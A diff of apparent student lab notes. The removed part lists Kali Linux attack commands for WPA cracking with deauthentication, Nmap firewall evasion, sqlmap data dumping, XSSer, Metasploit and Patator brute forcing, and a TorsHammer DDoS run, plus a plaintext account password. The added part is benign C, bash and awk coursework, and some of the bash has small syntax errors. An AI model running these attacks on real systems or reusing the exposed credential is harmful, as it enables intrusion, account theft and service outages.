@@ -1,81 +1,260 @@
-EXP - 3  WPA/WPA2 Cracking Using Kali Linux
-1. Check your wireless interface. => ifconfig
-2. Stop all interfering processes. => airmon-ng check kill
-3. Enable monitor mode on your WiFi adapter. => airmon-ng start wlan0
-4. Scan all nearby WiFi networks. => airodump-ng wlan0mon
-5. Capture handshake from the target network. => airodump-ng -c [channel] --bssid [BSSID] -w capture wlan0mon
-6. Disconnect clients to force a handshake. => aireplay-ng -0 10 -a [BSSID] wlan0mon
-7. Crack the WiFi password using a wordlist.=> aircrack-ng capture-01.cap -w /path/to/wordlist.txt
-8. View the cracked password in the terminal.
-Result:
-- Password will be shown if successfully cracked.
-=================================================================================================
-EXP 4: Automatic Wireless Network Cracking Using Kali Linux 
-1.Check available wireless interfaces on your system. This command lists your network interfaces to identify the WiFi adapter (usually wlan0). => ifconfig
-2.Monitor mode enables your adapter to listen to all wireless traffic nearby. => airmon-ng start wlan0
-3.Scan all nearby WiFi networks (channel hopping). This command continuously switches channels to detect all access points in range. => airodump-ng wlan0mon
-4.Target a specific WiFi network and capture handshake. Lock onto one access point, capture handshake data, and save it to a file. => airodump-ng -c [channel] --bssid [BSSID] -w capture wlan0mon
-5.Disconnect clients to force a handshake. Sends deauth packets to make users reconnect, which triggers a WPA handshake. => aireplay-ng -0 10 -a [BSSID] wlan0mon
-6.Wait until WPA handshake is captured. No command needed. Look for “WPA Handshake” in the top-right of airodump. => [No command, visual confirmation]
-7.Stop monitor mode after capturing the handshake. Return your adapter to managed mode for normal network usage. => airmon-ng stop wlan0mon
-8.Crack the WiFi password using a wordlist. Attempts to decrypt the handshake using a dictionary attack with your wordlist. => aircrack-ng capture-01.cap -w /path/to/wordlist.txt
-==============================================================
-EXP 5: Bypassing Firewalls Using Nmap in Kali Linux
-1.Fragmented Packets (-f) => nmap -f <target IP>
-2. Source Port Manipulation ( — source-port) => nmap --source-port 53 <target IP>
-3. Decoy Scanning (-D)=>nmap -D RND:10 <target IP>
-4. Idle Scan (-sI) => nmap -sI <zombie IP> <target IP>
-5. TCP ACK Scan (-sA) => nmap -sA <target IP>
-==================================================================
-EXP 6 SQL Injection Attack Using SQLMap
-1.List Available Databases. Use SQLMap to test if the website is vulnerable and list accessible databases. => sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs
-2List Tables in a Targeted Database. Specify the database name with -D and retrieve table names using the --tables option. => sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
-3.List Columns in a Target Table. Provide the table name using -T and list all columns using the --columns flag. => sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists --columns
-4.Dump Data from Specific Columns. Use -C to specify columns and --dump to extract data from the table. => sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists -C aname --dump
-====================================================================
-EXP 7: Cross-Site Scripting (XSS) Attack Using XSSer
-1. git clone https://github.com/epsylon/xsser.git 
-2. cd xsser
-3.python xsser -u "http://testasp.vulnweb.com" \
--g "Search.asp?tfSearch=XSS" \
---proxy "http://127.0.0.1:8118" \
---referer "666.666.666.666" \
---user-agent "correct audit" \
--s
-4.xsser -u 'https://target.com' -g '/path/profile.php?username=bob&surname=XSS&age=X1S&job=XSS'
-5.xsser -u 'https://target.com/login.php' -p 'username=bob&password=XSS&captcha=X1S'
-======================================================================
-EXP 8: Brute Force Attack Using Metasploit and Patator
-STEP 1: FTP Brute Force
-1.msfconsole
-2.use auxiliary/scanner/ftp/ftp_login
-3.set PASS_FILE /home/kali/Downloads/rockyou.txt
-4.set RHOSTS <Metasploit ip>
-5.run
-STEP 2:
-1.msfconsole
-2.use auxiliary/scanner/ssh/ssh_login
-3.set PASS_FILE /home/kali/Downloads/rockyou.txt
-4.set RHOSTS <Metasploit ip>
-5.run
-STEP 3:
-1.use auxiliary/scanner/telnet/telnet_login
-2.set USER_FILE /home/kali/Downloads/ssh-usernames.txt
-3.set PASS_FILE /home/kali/Downloads/rockyou.txt
-4.set RHOSTS <Metasploit ip>
-5.run
-STEP 4:
-1.sudo apt update
-2.sudo apt install patator
-3.patator ssh_login host=192.168.221.45 user=FILE0 password=FILE1 0=ssh-usernames.txt 1=rockyou.txt
-======================================================================
-EXP 9: DDOS attack using TorsHammer tool
-1.git clone https://github.com/dotfighter/torshammer.git
-2.cd torshammer
-3.ls
-4.python2 torshammer.py -t testphp.vulnweb.com -p 80 -r 5000
-5.python2 torshammer.py -t testphp.vulnweb.com -p 80 -r 5000 -T
-========================================================================
-port swigger login :
-srimithila.2253048@srec.ac.in
-R]S(EF.Rj.$d3b[WsoXYDpx@wQ288iSZ
+GTK
+sudo apt update
+sudo apt install libgtk-3-dev build-essential
+gcc `pkg-config --cflags gtk+-3.0` -o mygtkapp mygtkapp.c `pkg-config --libs gtk+-3.0`
+./mygtkapp
+#include <gtk/gtk.h>
+void on_button_clicked(GtkWidget *widget, gpointer data) {
+    GtkWidget *dialog = gtk_message_dialog_new(GTK_WINDOW(data),
+                                               GTK_DIALOG_DESTROY_WITH_PARENT,
+                                               GTK_MESSAGE_INFO,
+                                               GTK_BUTTONS_OK,
+                                               "Hello, GNOME!");
+    gtk_dialog_run(GTK_DIALOG(dialog));
+    gtk_widget_destroy(dialog);
+}
+int main(int argc, char *argv[]) {
+    gtk_init(&argc, &argv);
+    GtkWidget *window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
+    gtk_window_set_title(GTK_WINDOW(window), "Simple GTK+ Program");
+    gtk_container_set_border_width(GTK_CONTAINER(window), 10);
+    gtk_widget_set_size_request(window, 200, 100);
+    g_signal_connect(window, "destroy", G_CALLBACK(gtk_main_quit), NULL);
+    GtkWidget *button = gtk_button_new_with_label("Click Me");
+    g_signal_connect(button, "clicked", G_CALLBACK(on_button_clicked), window);
+    gtk_container_add(GTK_CONTAINER(window), button);
+    gtk_widget_show_all(window);
+    gtk_main();
+    return 0;
+}
+===================================================================================================================================
+Client / Server - shared mem
+client.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ipc.h>
+#include <sys/shm.h>
+#define SHM_SIZE 1024
+int main() {
+    key_t key = ftok("/tmp", 'A');
+    int shmid = shmget(key, SHM_SIZE, 0666);
+    char *shm_ptr = shmat(shmid, NULL, 0);
+    printf("Client: Sending message to server...\n");
+    strncpy(shm_ptr, "Hello from client", SHM_SIZE);
+    while (*shm_ptr == '\0');
+    printf("Client: Received response from server: %s\n", shm_ptr);
+    shmdt(shm_ptr);
+    return 0;
+}
+server.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ipc.h>
+#include <sys/shm.h>
+#define SHM_SIZE 1024
+int main() {
+    key_t key = ftok("/tmp", 'A');
+    int shmid = shmget(key, SHM_SIZE, IPC_CREAT | 0666);
+    char *shm_ptr = shmat(shmid, NULL, 0);
+    printf("Server: Waiting for client message...\n");
+    while (*shm_ptr == '\0');
+    printf("Server: Received message from client: %s\n", shm_ptr);
+    strncpy(shm_ptr, "Hello from server", SHM_SIZE);
+    shmdt(shm_ptr);
+    shmctl(shmid, IPC_RMID, NULL);
+    return 0;
+}
+--------------
+client & server - socket:
+client.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+
+#define PORT 8080
+#define BUFFER_SIZE 1024
+
+int main() {
+    int sock = 0;
+    struct sockaddr_in server_address;
+    char buffer[BUFFER_SIZE] = {0};
+    const char *message = "Hello from client";
+
+    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+        perror("socket failed");
+        exit(EXIT_FAILURE);
+    }
+    server_address.sin_family = AF_INET;
+    server_address.sin_port = htons(PORT);
+    if (inet_pton(AF_INET, "127.0.0.1", &server_address.sin_addr) <= 0) {
+        perror("inet_pton failed");
+        exit(EXIT_FAILURE);
+    }
+    if (connect(sock, (struct sockaddr *)&server_address, sizeof(server_address)) < 0) {
+        perror("connect failed");
+        exit(EXIT_FAILURE);
+    }
+    send(sock, message, strlen(message), 0);
+    printf("Message sent to server\n");
+    read(sock, buffer, BUFFER_SIZE);
+    printf("Server: %s\n", buffer);
+    return 0;
+}
+server.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+#define PORT 8080
+#define BUFFER_SIZE 1024
+int main() {
+    int server_fd, new_socket;
+    struct sockaddr_in address;
+    int addrlen = sizeof(address);
+    char buffer[BUFFER_SIZE] = {0};
+    const char *message = "Hello from server";
+    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
+        perror("socket failed");
+        exit(EXIT_FAILURE);
+    }
+    address.sin_family = AF_INET;
+    address.sin_addr.s_addr = INADDR_ANY;
+    address.sin_port = htons(PORT);
+    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
+        perror("bind failed");
+        exit(EXIT_FAILURE);
+    }
+    if (listen(server_fd, 3) < 0) {
+        perror("listen failed");
+        exit(EXIT_FAILURE);
+    }
+    printf("Server listening on port %d...\n", PORT);
+    if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t *)&addrlen)) < 0) {
+        perror("accept failed");
+        exit(EXIT_FAILURE);
+    }
+    read(new_socket, buffer, BUFFER_SIZE);
+    printf("Client: %s\n", buffer);
+    send(new_socket, message, strlen(message), 0);
+    printf("Message sent to client\n");
+    return 0;
+}
+============================================================================================================================================================
+Process attributes and usage of forks 
+1.
+a#!/bin/bash 
+echo "Process ID (PID): $$" 
+echo "Parent Process ID (PPID): $PPID" 
+echo "User ID (UID): $UID" 
+echo "Group ID (GID): $GROUPS" 
+2. fork => & 
+#!/bin/bash 
+echo "Parent ID (PID): $$" 
+child_process(){ 
+echo "Child Process ID (PID): $$ " 
+} 
+child_process & 
+wait 
+echo "Parent Process Exits"
+fork => ():
+#!/bin/bash
+echo "Parent process ID: $$"
+(
+  echo "Child process started."
+  echo "Child process ID: $$"
+  sleep 2
+  echo "Child process finished."
+) &
+echo "Parent is doing other work..."
+wait
+echo "Parent process finished."
+============================================================================================================================================================
+awk1.awk
+#!/usr/bin/awk -f 
+# Set the field separator to comma 
+BEGIN { 
+FS="," 
+} 
+# Skip the first line (header) 
+NR == 1 { 
+next 
+} 
+# Print Name and Gender fields 
+{ 
+print "Name: " $1 ", Department: " $3 
+}
+
+data.csv 
+cat data.csv
+Name,Position,Department,Salary
+ajay,manager,account,45000
+sunil,clerk,account,25000
+./awk1/awk data.csv
+Name: ajay, Department: account
+Name: sunil, Department: account
+============================================================================================================================================================
+bash scripts
+1. greatest of 3 numbers:
+echo "Enter 3 numbers:" 
+read a 
+read b 
+read c 
+if [ $a -gt $b ] && [ $a -gt $c ] 
+then 
+echo "$a is greater" 
+elif [ $b-gt $a ] && [ $b -gt $c ] 
+then 
+echo "$b is greater" 
+else 
+echo "$c is greater" 
+fi 
+2.odd / even
+echo "Enter a number:" 
+read a 
+if [ $(($a % 2)) -eq 0 ]; 
+then echo "$a is even"; 
+else echo "$a is odd"; 
+fi 
+3.sum of n numbers:
+echo "ENTER A NUMBER" 
+read n 
+su=0 
+i=0 
+while [ $i -lt $n ] 
+do 
+echo "enter number" 
+read a 
+su=$((su+a)) 
+i=$((i+1)) 
+done 
+echo "the sum is $su" 
+4.fibonacci series
+echo "Enter a number:” 
+read n 
+i=3 
+n1=0 
+n2=1 
+echo "$n1" 
+echo "$n2" 
+while [ $i -le $n ] 
+do 
+n3=$((n1+n2)) 
+echo "$n3" 
+n1=$n2 
+n2=$n3 
+i=$((i+1)) 
+done
+5.factorial
+echo "enter a number:" 
+read a 
+fact=1 
+while [ $a -gt 1 ] do 
+fact=$((fact * a)) 
+a=$((a-1)) done 
+echo "the factorial is $fact" 
+============================================================================================================================================================
